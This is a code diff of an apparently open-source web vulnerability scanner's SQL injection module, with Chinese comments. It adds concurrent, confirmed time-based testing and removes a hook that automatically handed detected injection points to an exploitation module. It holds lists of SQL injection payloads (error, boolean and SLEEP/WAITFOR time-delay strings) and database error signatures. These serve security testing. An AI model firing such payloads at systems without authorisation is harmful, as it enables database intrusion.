@@ -1,190 +1,155 @@
 """
-SQL 注入检测模块 — WebVulnScanner v6.0
+SQL 注入检测模块（报错 / 布尔 / 时延盲注）
 Author: 火柴 | GitHub: huocai250
 
-[优化] 集成自动利用：检测到注入后自动调用 SQLiExploiter
-[优化] 改进时延基准采样
-[优化] 统一使用 logging
+v4.0 改进：
+  - 测试爬虫发现的真实注入点（URL 参数 + 表单），而非仅猜测参数名
+  - 并发测试各注入点
+  - 时延盲注：先测基线响应时间，再二次确认，显著降低误报
 """
-import logging
-from core.logger import C as Colors
-log = logging.getLogger("webscan")
-
 import re
 import time
-from utils.http import extract_forms
+import statistics
 from core.scanner import BaseScanner
-
+from core.colors import log
+from utils.http import build_url
 
 ERROR_PATTERNS = [
     r"SQL syntax.*?MySQL", r"Warning.*?mysql_", r"MySQLSyntaxErrorException",
     r"check the manual that (corresponds to|fits) your MySQL",
+    r"com\.mysql\.jdbc\.exceptions",
     r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server",
     r"SQLServer JDBC Driver", r"Incorrect syntax near",
-    r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver",
-    r"quoted string not properly terminated",
-    r"PostgreSQL.*ERROR", r"Warning.*pg_", r"Npgsql\.",
+    r"ODBC SQL Server Driver", r"\[SQL Server\]",
+    r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver", r"quoted string not properly terminated",
+    r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result", r"Npgsql\.",
     r"PG::SyntaxError", r"ERROR:\s+syntax error at or near",
-    r"SQLite/JDBCDriver", r"SQLite\.Exception",
+    r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
     r"Warning.*sqlite_", r"SQLITE_ERROR",
-    r"Syntax error.*in query expression",
-    r"Microsoft Access Driver",
+    r"Syntax error.*in query expression", r"Data type mismatch",
+    r"Microsoft Access Driver", r"JET Database Engine",
 ]
 
 BOOLEAN_PAYLOADS = [
     ("' AND '1'='1", "' AND '1'='2"),
-    (" AND 1=1",      " AND 1=2"),
+    (" AND 1=1",     " AND 1=2"),
     ("' AND 1=1--",  "' AND 1=2--"),
+    (" OR 1=1",      " OR 1=2"),
 ]
 
 TIME_PAYLOADS = [
-    "'; WAITFOR DELAY '0:0:3'--",
-    "' AND SLEEP(3)--",
-    "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
-    "1; SELECT pg_sleep(3)--",
+    "'; WAITFOR DELAY '0:0:{d}'--",
+    "' AND SLEEP({d})--",
+    "1 AND (SELECT * FROM (SELECT(SLEEP({d})))a)--",
 ]
 
 ERROR_PAYLOADS = [
-    "'", '"', "' OR '1'='1",
+    "'", '"', "';", '";', "' OR '", ") OR (", "' OR 1=1--",
     "' UNION SELECT NULL--",
     "' UNION SELECT NULL,NULL--",
-    "1 ORDER BY 1--",
     "1 ORDER BY 999--",
     "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
 ]
 
 COMMON_PARAMS = ["id", "page", "q", "search", "keyword", "cat",
-                 "item", "user", "uid", "pid", "cid", "type", "sort",
-                 "order", "by", "name", "key", "value", "data"]
+                 "item", "user", "uid", "pid", "cid", "type", "sort"]
+
+DELAY = 3   # 时延盲注注入的秒数
 
 
 class SQLiScanner(BaseScanner):
+    name = "sqli"
+
     def run(self):
-        _before = self.result.total()
-        log.info("SQL 注入检测（报错/布尔/时延）...")
-        r = self.get(self.target)
-        self._baseline_time = self._sample_baseline()
-        self._test_url_params()
-        if r:
-            for i, form in enumerate(extract_forms(r.text)):
-                self._test_form(form, i)
-        self._log_module_done("SQL注入", _before)
-
-    def _sample_baseline(self) -> float:
-        times = []
-        for _ in range(3):
-            t0 = time.time()
-            self.get(self.target)
-            times.append(time.time() - t0)
-        return sum(times) / len(times) if times else 1.0
-
-    def _test_url_params(self):
-        for param in COMMON_PARAMS:
-            if self._test_error_based(self.target, {param: "1"}, param, "GET"):
-                continue
-            if self._test_boolean_based(self.target, {param: "1"}, param, "GET"):
-                continue
-            self._test_time_based(self.target, {param: "1"}, param, "GET")
-
-    def _test_form(self, form, idx):
-        action = form["action"] or self.target
-        if not action.startswith("http"):
-            action = self.build_url(action)
-        for param in form["inputs"]:
-            if self._test_error_based(action, form["inputs"].copy(), param, form["method"]):
-                return
-            if self._test_boolean_based(action, form["inputs"].copy(), param, form["method"]):
-                return
-            self._test_time_based(action, form["inputs"].copy(), param, form["method"])
-
-    def _test_error_based(self, url, params, param, method) -> bool:
-        for payload in ERROR_PAYLOADS:
-            test = params.copy()
-            test[param] = str(params.get(param, "1")) + payload
-            r = self._req(method, url, test)
-            if r and self._has_sql_error(r.text):
-                log.warning(f"[VULN][报错注入] 参数: {param} | Payload: {payload[:30]}")
-                exploit_result = ""
-                if self.exploit_mode:
-                    exploit_result = self._run_exploit(url, param, method, params)
-                self.result.add("SQL 注入", "CRITICAL",
-                                f"[报错注入] 参数 '{param}' 存在 SQL 注入",
-                                f"Payload: {payload}", url=url,
-                                exploit_result=exploit_result)
-                return True
-        return False
-
-    def _test_boolean_based(self, url, params, param, method) -> bool:
-        orig_r = self._req(method, url, params)
-        if not orig_r:
-            return False
-        orig_len = len(orig_r.text)
-        for true_p, false_p in BOOLEAN_PAYLOADS:
-            base_val = str(params.get(param, "1"))
-            t = params.copy(); t[param] = base_val + true_p
-            f = params.copy(); f[param] = base_val + false_p
-            tr = self._req(method, url, t)
-            fr = self._req(method, url, f)
-            if not (tr and fr):
-                continue
-            if (abs(len(tr.text) - orig_len) < 30 and
-                    abs(len(fr.text) - orig_len) > 80):
-                log.warning(f"[VULN][布尔盲注] 参数: {param}")
-                exploit_result = ""
-                if self.exploit_mode:
-                    exploit_result = self._run_exploit(url, param, method, params)
-                self.result.add("SQL 注入", "HIGH",
-                                f"[布尔盲注] 参数 '{param}' 疑似布尔盲注",
-                                f"orig={orig_len} true={len(tr.text)} false={len(fr.text)}",
-                                url=url, exploit_result=exploit_result)
-                return True
-        return False
-
-    def _test_time_based(self, url, params, param, method) -> bool:
-        threshold = max(self._baseline_time * 2 + 2.0, 3.0)
-        for payload in TIME_PAYLOADS:
-            test = params.copy()
-            test[param] = str(params.get(param, "1")) + payload
-            t0 = time.time()
-            self._req(method, url, test)
-            elapsed = time.time() - t0
-            if elapsed >= threshold:
-                log.warning(f"[VULN][时延盲注] 参数: {param} 响应 {elapsed:.1f}s")
-                exploit_result = ""
-                if self.exploit_mode:
-                    exploit_result = self._run_exploit(url, param, method, params)
-                self.result.add("SQL 注入", "HIGH",
-                                f"[时延盲注] 参数 '{param}' (响应 {elapsed:.1f}s)",
-                                f"Payload: {payload}", url=url,
-                                exploit_result=exploit_result)
-                return True
-        return False
-
-    def _run_exploit(self, url, param, method, base_params) -> str:
-        """[新增] 调用利用模块"""
-        try:
-            from modules.exploit.sqli_exploit import SQLiExploiter
-            exploiter = SQLiExploiter(self)
-            info = exploiter.exploit(url, param, method, base_params)
-            # 将详细利用结果存入 extra
-            lines = []
-            for k, v in info.items():
-                if isinstance(v, (str, int, float)):
-                    lines.append(f"{k}: {v}")
-                elif isinstance(v, list):
-                    lines.append(f"{k}: {', '.join(str(x) for x in v[:10])}")
-                elif isinstance(v, dict):
-                    for kk, vv in list(v.items())[:5]:
-                        lines.append(f"  {kk}: {str(vv)[:100]}")
-            return "\n".join(lines)
-        except Exception as e:
-            log.debug(f"SQLi 利用异常: {e}")
-            return f"利用失败: {e}"
+        log("INFO", "SQL 注入检测（报错/布尔/时延，并发）...")
+        targets = self.injection_targets(COMMON_PARAMS)
+        if not targets:
+            log("SKIP", "无可测试参数")
+            return
+        log("INFO", f"共 {len(targets)} 个参数点待测")
+        self.map(self._test_param, targets)
 
     def _req(self, method, url, params):
         if method == "POST":
             return self.post(url, data=params)
-        return self.get(url, params=params)
+        return self.get(build_url(url, params))
 
-    def _has_sql_error(self, text: str) -> bool:
+    def _test_param(self, target):
+        url, method, params, pname = target
+        if self._error_based(url, method, params, pname):
+            return f"{pname}@{url}"
+        if self._boolean_based(url, method, params, pname):
+            return f"{pname}@{url}"
+        if self._time_based(url, method, params, pname):
+            return f"{pname}@{url}"
+        return None
+
+    def _error_based(self, url, method, params, pname):
+        for payload in ERROR_PAYLOADS:
+            test = dict(params); test[pname] = payload
+            r = self._req(method, url, test)
+            if r and self._has_sql_error(r.text):
+                log("VULN", f"[报错注入] 参数: {pname} | Payload: {payload[:30]}")
+                self.add("SQL 注入", "CRITICAL",
+                         f"[报错注入] 参数 '{pname}' 存在 SQL 注入",
+                         f"Payload: {payload} @ {url}", url=url)
+                return True
+        return False
+
+    def _boolean_based(self, url, method, params, pname):
+        base = dict(params)
+        base_r = self._req(method, url, base)
+        if not base_r:
+            return False
+        base_len = len(base_r.text)
+        for true_p, false_p in BOOLEAN_PAYLOADS:
+            t = dict(params); t[pname] = str(params.get(pname, "1")) + true_p
+            f = dict(params); f[pname] = str(params.get(pname, "1")) + false_p
+            tr = self._req(method, url, t)
+            fr = self._req(method, url, f)
+            if tr and fr:
+                len_diff = abs(len(tr.text) - len(fr.text))
+                # true 与基线接近、false 明显不同 → 疑似布尔盲注
+                if len_diff > 50 and abs(len(tr.text) - base_len) < 20:
+                    log("VULN", f"[布尔盲注] 参数: {pname} | 响应长度差: {len_diff}")
+                    self.add("SQL 注入", "HIGH",
+                             f"[布尔盲注] 参数 '{pname}' 疑似布尔盲注",
+                             f"true_len={len(tr.text)} false_len={len(fr.text)} @ {url}",
+                             url=url, confidence="疑似")
+                    return True
+        return False
+
+    def _time_based(self, url, method, params, pname):
+        # 先测量 2~3 次基线响应时间
+        base_times = []
+        for _ in range(2):
+            start = time.time()
+            self._req(method, url, dict(params))
+            base_times.append(time.time() - start)
+        base = statistics.median(base_times) if base_times else 0.0
+        threshold = base + DELAY * 0.7        # 需明显高于基线
+
+        for tmpl in TIME_PAYLOADS:
+            payload = tmpl.format(d=DELAY)
+            test = dict(params); test[pname] = payload
+            start = time.time()
+            r = self._req(method, url, test)
+            elapsed = time.time() - start
+            if r and elapsed >= threshold:
+                # 二次确认：用更长延迟再打一次，避免偶发网络抖动误报
+                confirm_payload = tmpl.format(d=DELAY + 2)
+                test[pname] = confirm_payload
+                s2 = time.time()
+                self._req(method, url, test)
+                e2 = time.time() - s2
+                if e2 >= elapsed + 1:
+                    log("VULN", f"[时延盲注] 参数: {pname} ({elapsed:.1f}s→{e2:.1f}s)")
+                    self.add("SQL 注入", "HIGH",
+                             f"[时延盲注] 参数 '{pname}' 确认时延盲注 "
+                             f"(基线 {base:.1f}s, 注入后 {elapsed:.1f}s/{e2:.1f}s)",
+                             f"Payload: {payload} @ {url}", url=url)
+                    return True
+        return False
+
+    def _has_sql_error(self, text):
         return any(re.search(p, text, re.I) for p in ERROR_PATTERNS)
